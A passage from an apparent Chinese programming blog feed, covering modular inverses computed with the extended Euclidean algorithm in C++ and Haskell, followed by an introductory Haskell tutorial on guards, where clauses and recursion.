xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mo fence="true">{</mo><mtable rowspacing="0.36em" columnalign="left left" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>a</mi><mi>x</mi><mo>+</mo><mi>b</mi><mi>y</mi><mo>=</mo><mrow><mi mathvariant="normal">g</mi><mi mathvariant="normal">c</mi><mi mathvariant="normal">d</mi></mrow><mrow><mo fence="true">(</mo><mi>a</mi><mo separator="true">,</mo><mi>b</mi><mo fence="true">)</mo></mrow></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mrow><mo fence="true">(</mo><mi>b</mi><mtext> </mtext><mtext> </mtext><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mi>a</mi><mo fence="true">)</mo></mrow><mi>x</mi><mo mathvariant="normal">′</mo><mo>+</mo><mi>a</mi><mi>y</mi><mo mathvariant="normal">′</mo><mo>=</mo><mtext> </mtext><mtext> </mtext><mrow><mi mathvariant="normal">g</mi><mi mathvariant="normal">c</mi><mi mathvariant="normal">d</mi></mrow><mrow><mo fence="true">(</mo><mi>a</mi><mo separator="true">,</mo><mi>b</mi><mo fence="true">)</mo></mrow></mrow></mstyle></mtd></mtr></mtable></mrow><annotation encoding="application/x-tex">\begin{cases}ax+by=\mathrm{gcd}\left( a,b \right)\\\left( b\,\,\mathrm{mod} \ a \right) x\prime+ay\prime =\,\,\mathrm{gcd}\left( a,b \right)\\\end{cases}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:3em;vertical-align:-1.25em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size4">{</span></span><span class="mord"><span class="mtable"><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.69em;"><span style="top:-3.69em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord mathnormal">b</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord"><span class="mord mathrm">gcd</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord mathnormal">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">b</span><span class="mclose delimcenter" style="top:0em;">)</span></span></span></span><span style="top:-2.25em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathrm">mod</span></span><span class="mspace"> </span><span class="mord mathnormal">a</span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">x</span><span class="mord">′</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mord">′</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord"><span class="mord mathrm">gcd</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord mathnormal">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">b</span><span class="mclose delimcenter" style="top:0em;">)</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.19em;"><span></span></span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span></p><p>第二个式子可以等价的写成：</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mrow><mo fence="true">(</mo><mi>b</mi><mtext> </mtext><mtext> </mtext><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mi>a</mi><mo fence="true">)</mo></mrow><mi>x</mi><mo mathvariant="normal">′</mo><mo>+</mo><mi>a</mi><mi>y</mi><mo mathvariant="normal">′</mo><mo>=</mo><mrow><mo fence="true">(</mo><mi>b</mi><mo>−</mo><mo stretchy="false">⌊</mo><mfrac><mi>b</mi><mi>a</mi></mfrac><mo stretchy="false">⌋</mo><mi>a</mi><mo fence="true">)</mo></mrow><mi>x</mi><mo mathvariant="normal">′</mo><mo>+</mo><mi>a</mi><mi>y</mi><mo mathvariant="normal">′</mo><mo>=</mo><mi>a</mi><mrow><mo fence="true">(</mo><mi>y</mi><mo mathvariant="normal">′</mo><mo>−</mo><mo stretchy="false">⌊</mo><mfrac><mi>b</mi><mi>a</mi></mfrac><mo stretchy="false">⌋</mo><mi>x</mi><mo mathvariant="normal">′</mo><mo fence="true">)</mo></mrow><mo>+</mo><mi>b</mi><mi>x</mi><mo mathvariant="normal">′</mo><mo>=</mo><mrow><mi mathvariant="normal">g</mi><mi mathvariant="normal">c</mi><mi mathvariant="normal">d</mi></mrow><mrow><mo fence="true">(</mo><mi>a</mi><mo separator="true">,</mo><mi>b</mi><mo fence="true">)</mo></mrow></mrow><annotation encoding="application/x-tex">\left( b\,\,\mathrm{mod}\ a \right) x\prime+ay\prime=\left( b-\lfloor \frac{b}{a} \rfloor a \right) x\prime+ay\prime=a\left( y\prime-\lfloor \frac{b}{a} \rfloor x\prime \right) +bx\prime=\mathrm{gcd}\left( a,b \right)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathrm">mod</span></span><span class="mspace"> </span><span class="mord mathnormal">a</span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">x</span><span class="mord">′</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.75em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mord">′</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:2.4em;vertical-align:-0.95em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size3">(</span></span><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mopen">⌊</span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.3714em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">a</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">b</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mclose">⌋</span><span class="mord mathnormal">a</span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size3">)</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">x</span><span class="mord">′</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.75em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mord">′</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:2.4em;vertical-align:-0.95em;"></span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size3">(</span></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mord">′</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mopen">⌊</span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.3714em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">a</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">b</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mclose">⌋</span><span class="mord mathnormal">x</span><span class="mord">′</span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size3">)</span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">b</span><span class="mord mathnormal">x</span><span class="mord">′</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathrm">gcd</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord mathnormal">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">b</span><span class="mclose delimcenter" style="top:0em;">)</span></span></span></span></span></span></p><p>也就是说每一次辗转相除之前和之后的 x, y 满足下面的关系：</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mo fence="true">{</mo><mtable rowspacing="0.16em" columnalign="center" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>x</mi><mo>=</mo><mi>y</mi><mo mathvariant="normal">′</mo><mo>−</mo><mo stretchy="false">⌊</mo><mfrac><mi>b</mi><mi>a</mi></mfrac><mo stretchy="false">⌋</mo><mi>x</mi><mo mathvariant="normal">′</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>y</mi><mo>=</mo><mi>x</mi><mo mathvariant="normal">′</mo></mrow></mstyle></mtd></mtr></mtable></mrow><annotation encoding="application/x-tex">\left\{ \begin{array}{c}x=y\prime-\lfloor \frac{b}{a} \rfloor x\prime\\y=x\prime\\\end{array} \right.</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:2.4401em;vertical-align:-0.9701em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size3">{</span></span><span class="mord"><span class="mtable"><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.4701em;"><span style="top:-3.5899em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mord">′</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mopen">⌊</span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8801em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">a</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">b</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mclose">⌋</span><span class="mord mathnormal">x</span><span class="mord">′</span></span></span><span style="top:-2.3899em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord mathnormal">x</span><span class="mord">′</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.9701em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span></p><p>也就是说每次回溯的时候应该按照上面的式子，修改之前的值。</p><p>所以 C++ 程序如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//最大公约数</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">gcd</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (a % b == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> b;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">int</span> t = a;</span><br><span class="line">        a = b;</span><br><span class="line">        b = t % b;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">gcd</span>(a, b);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">extgcd</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b, <span class="type">int</span> &amp;x, <span class="type">int</span> &amp;y)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (a == <span class="number">0</span>) &#123;</span><br><span class="line">        x = <span class="number">0</span>, y = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">extgcd</span>(b % a, a, x, y);</span><br><span class="line">    <span class="type">int</span> t = x;</span><br><span class="line">    x = y - b / a * x;</span><br><span class="line">    y = t;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">euclid_mod_reverse1</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//检查输入合法</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">gcd</span>(a, n) != <span class="number">1</span> || a &lt;= <span class="number">0</span> || n &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> x, y;</span><br><span class="line">    <span class="built_in">extgcd</span>(a, n, x, y);</span><br><span class="line">    <span class="keyword">return</span> (n + x % n) % n;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Haskell 的程序或許更加直观：</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">modInverse</span> :: <span class="type">Int</span> -&gt; <span class="type">Int</span> -&gt; <span class="type">Maybe</span> <span class="type">Int</span></span><br><span class="line"><span class="title">modInverse</span> a n = <span class="keyword">case</span> gcd a n <span class="keyword">of</span></span><br><span class="line">  <span class="number">1</span> -&gt; <span class="type">Just</span> $ makePositive $ fst $ extgcd a n</span><br><span class="line">  _ -&gt; <span class="type">Nothing</span></span><br><span class="line">  <span class="keyword">where</span></span><br><span class="line">    extgcd <span class="number">0</span> b = (<span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">    extgcd a b =</span><br><span class="line">      <span class="keyword">let</span> (x&#x27;, y&#x27;) = extgcd (b `mod` a) a</span><br><span class="line">          x = y&#x27; - (b `div` a) * x&#x27;</span><br><span class="line">          y = x&#x27;</span><br><span class="line">      <span class="keyword">in</span> (x, y)</span><br><span class="line">    makePositive x = <span class="keyword">if</span> x &gt;= <span class="number">0</span> <span class="keyword">then</span> x <span class="keyword">else</span> x + n</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;blockquote&gt;
&lt;ol class=&quot;series-items&quot;&gt;&lt;li&gt;&lt;a href=&quot;/cs-courses/C-language-basis/&quot; title=&quot;C语言基础&quot;&gt;C语言基础&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/cs-courses/modular-inverses/&quot; title=&quot;乘法逆元&quot;&gt;乘法逆元&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/cs-courses/cpp-cryptographic-algorithm-basis/&quot; title=&quot;信息安全算法基础&quot;&gt;信息安全算法基础&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/cs-courses/OS/&quot; title=&quot;操作系统基础&quot;&gt;操作系统基础&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/cs-courses/x86-masm/&quot; title=&quot;x86汇编基础&quot;&gt;x86汇编基础&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/cs-courses/information-theory/&quot; title=&quot;信息论与编码&quot;&gt;信息论与编码&lt;/a&gt;&lt;/li&gt;&lt;/ol&gt;
&lt;/blockquote&gt;
&lt;</summary>
        
      
    
    
    
    <category term="courses" scheme="https://www.blog-blockchain.xyz/categories/courses/"/>
    
    
    <category term="crypto" scheme="https://www.blog-blockchain.xyz/tags/crypto/"/>
    
  </entry>
  
  <entry>
    <title>Haskell(二)函数式编程</title>
    <link href="https://www.blog-blockchain.xyz/fp/FP-haskell-2/"/>
    <id>https://www.blog-blockchain.xyz/fp/FP-haskell-2/</id>
    <published>2022-08-29T13:50:33.000Z</published>
    <updated>2024-11-15T14:30:54.922Z</updated>
    
    <content type="html"><![CDATA[<blockquote><ol class="series-items"><li><a href="/fp/FP-haskell-1/" title="Haskell(一)入门">Haskell(一)入门</a></li><li><a href="/fp/FP-haskell-2/" title="Haskell(二)函数式编程">Haskell(二)函数式编程</a></li><li><a href="/fp/monad/" title="Haskell(三) Monad">Haskell(三) Monad</a></li><li><a href="/fp/Haskell-summary-toolchain/" title="Haskell(四)总结和工具链">Haskell(四)总结和工具链</a></li><li><a href="/fp/Haskell-epilogue/" title="Haskell(五) 总结和展望">Haskell(五) 总结和展望</a></li><li><a href="/fp/project-euler/" title="Haskell(六) Project Euler 练习1-26">Haskell(六) Project Euler 练习1-26</a></li></ol></blockquote><p>首先，我们需要将自己的编程观念从命令式语言转换到函数式语言上面来。这样做的原因并不是因为命令式语言不好，而是因为比起命令式语言，函数式语言更胜一筹。</p><h1>基本用法</h1><p>先看一些简单的程序，了解基本用法。</p><p>斐波那契数列：</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">fab</span> n = <span class="keyword">if</span> n==<span class="number">1</span>||n==<span class="number">2</span> <span class="keyword">then</span> <span class="number">1</span> <span class="keyword">else</span> fab (n-<span class="number">1</span>) + fab (n-<span class="number">2</span>)</span><br></pre></td></tr></table></figure><p>也可以利用模式匹配写成下面的样子，这个类似于分支语句，叫做 Guards</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">fab</span> n | n==<span class="number">1</span>||n==<span class="number">2</span> =<span class="number">1</span> | n&gt;<span class="number">2</span> = (fab (n-<span class="number">1</span>) + fab (n-<span class="number">2</span>))</span><br></pre></td></tr></table></figure><p>在 Haskell 中，<code>|</code> 被用于定义函数的多重条件分支。它可以用来在函数定义中指定多个条件，并根据不同的条件执行不同的代码。它的基本语法形式如下：</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">functionName</span> pattern1 | condition1 = codeBlock1</span><br><span class="line">                     | condition2 = codeBlock2</span><br><span class="line">                     | condition3 = codeBlock3</span><br><span class="line">                     ...</span><br><span class="line">                     | otherwise  = codeBlockN</span><br></pre></td></tr></table></figure><p>其中，<code>functionName </code>是函数名，<code>pattern1 </code>是函数的参数模式，<code>condition1</code>、<code>condition2</code>、<code>condition3 </code>等是不同的条件，<code>codeBlock1</code>、<code>codeBlock2</code>、<code>codeBlock3 </code>等是相应的代码块，<code>otherwise </code>是最后一个条件，用于匹配所有的其他情况。在多重条件分支中，只有第一个匹配的条件的代码块将被执行，其他的条件将被忽略。</p><p><strong><code>where</code>关键字或内置函数，可在运行时用于生成所需的输出，暂存中间的计算结果</strong>。当函数计算变得复杂时，这将非常有用。<code>where</code>子句将整个表达式分解成小部分。</p><p><code>do</code> 关键字引入一个块，标识那些带有副作用的代码</p><p>求二次方程的根：</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">roots</span> (a, b, c) = (x1, x2) <span class="keyword">where</span></span><br><span class="line">  x1 = e + sqrt d/(<span class="number">2</span>*a)</span><br><span class="line">  x2 = e - sqrt d/(<span class="number">2</span>*a)</span><br><span class="line">  d = b * b - <span class="number">4</span> * a * c</span><br><span class="line">  e = -b/(<span class="number">2</span>*a)</span><br><span class="line"><span class="title">main</span> = <span class="keyword">do</span></span><br><span class="line">   putStrLn <span class="string">&quot;The roots of our Polynomial equation are:&quot;</span></span><br><span class="line">   print (roots(<span class="number">1</span>,-<span class="number">8</span>,<span class="number">6</span>))</span><br></pre></td></tr></table></figure><h1>循环</h1><p>Haskell 既没有 <code>for</code> 循环，也没有 <code>while</code> 循环，一般用递归来代替。</p><h2 id="递归示例-1">递归示例 1</h2><p>例如一个 C 函数，它将字符串表示的数字转换成整数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">as_int</span><span class="params">(<span class="type">char</span> *str)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> acc; <span class="comment">// accumulate the partial result</span></span><br><span class="line">    <span class="keyword">for</span> (acc = <span class="number">0</span>; <span class="built_in">isdigit</span>(*str); str++)&#123;</span><br><span class="line">        acc = acc * <span class="number">10</span> + (*str -<span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> acc;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>也可以写成递归的形式：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">loop</span><span class="params">(<span class="type">char</span> *str, <span class="type">int</span> acc)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strlen</span>(str) == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> acc;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        acc = acc * <span class="number">10</span> + *str - <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">        *str++;</span><br><span class="line">        <span class="keyword">return</span> loop(str, acc);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">as_int</span><span class="params">(<span class="type">char</span> *str)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> loop(str, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> a[] = <span class="string">&quot;124&quot;</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, as_int(a));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果使用 Haskell 递归来实现的话可能会简洁一些。</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 库函数，字符转数字</span></span><br><span class="line"><span class="keyword">import</span> Data.Char (<span class="title">digitToInt</span>)</span><br><span class="line"><span class="title">asInt</span> :: <span class="type">String</span> -&gt; <span class="type">Int</span> <span class="comment">-- 定义函数类型</span></span><br><span class="line"><span class="title">asInt</span>  = loop <span class="number">0</span></span><br><span class="line">  <span class="keyword">where</span></span><br><span class="line">    loop :: <span class="type">Int</span> -&gt; <span class="type">String</span> -&gt; <span class="type">Int</span> <span class="comment">--定义函数类型，也即下面的形式</span></span><br><span class="line">    loop acc [] = acc <span class="comment">-- acc 是整数变量，空列表就返回累积的数</span></span><br><span class="line">    <span class="comment">-- 如果不为空，那么继续累积</span></span><br><span class="line">    loop acc (x:xs) = <span class="keyword">let</span> acc&#x27; = acc * <span class="number">10</span> + digitToInt x</span><br><span class="line">                      <span class="keyword">in</span> loop acc&#x27; xs</span><br></pre></td></tr></table></figure><p>可以看到，函数式编程语言相比命令式编程语言，提供了截然不同的视角。</p><p>这里使用到了 <code>let ... in</code> 关键字，它的含义是在 <code>let</code> 后定义局部表达式，然后在 <code>in</code> 后面用上。可以见 <a href="https://stackoverflow.com/users/5053374/libby">Libby</a> 的<a href="https://stackoverflow.com/a/52705857/15272222">回答</a></p><blockquote><p><code>in</code> goes along with <code>let</code> to name one or more local expressions in a pure function.</p><p>So, to use a simpler example,</p><figure class="highlight hs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">foo</span> =</span><br><span class="line"><span class="title">let</span> greeting = <span class="string">&quot;hello&quot;</span> <span class="keyword">in</span></span><br><span class="line"> 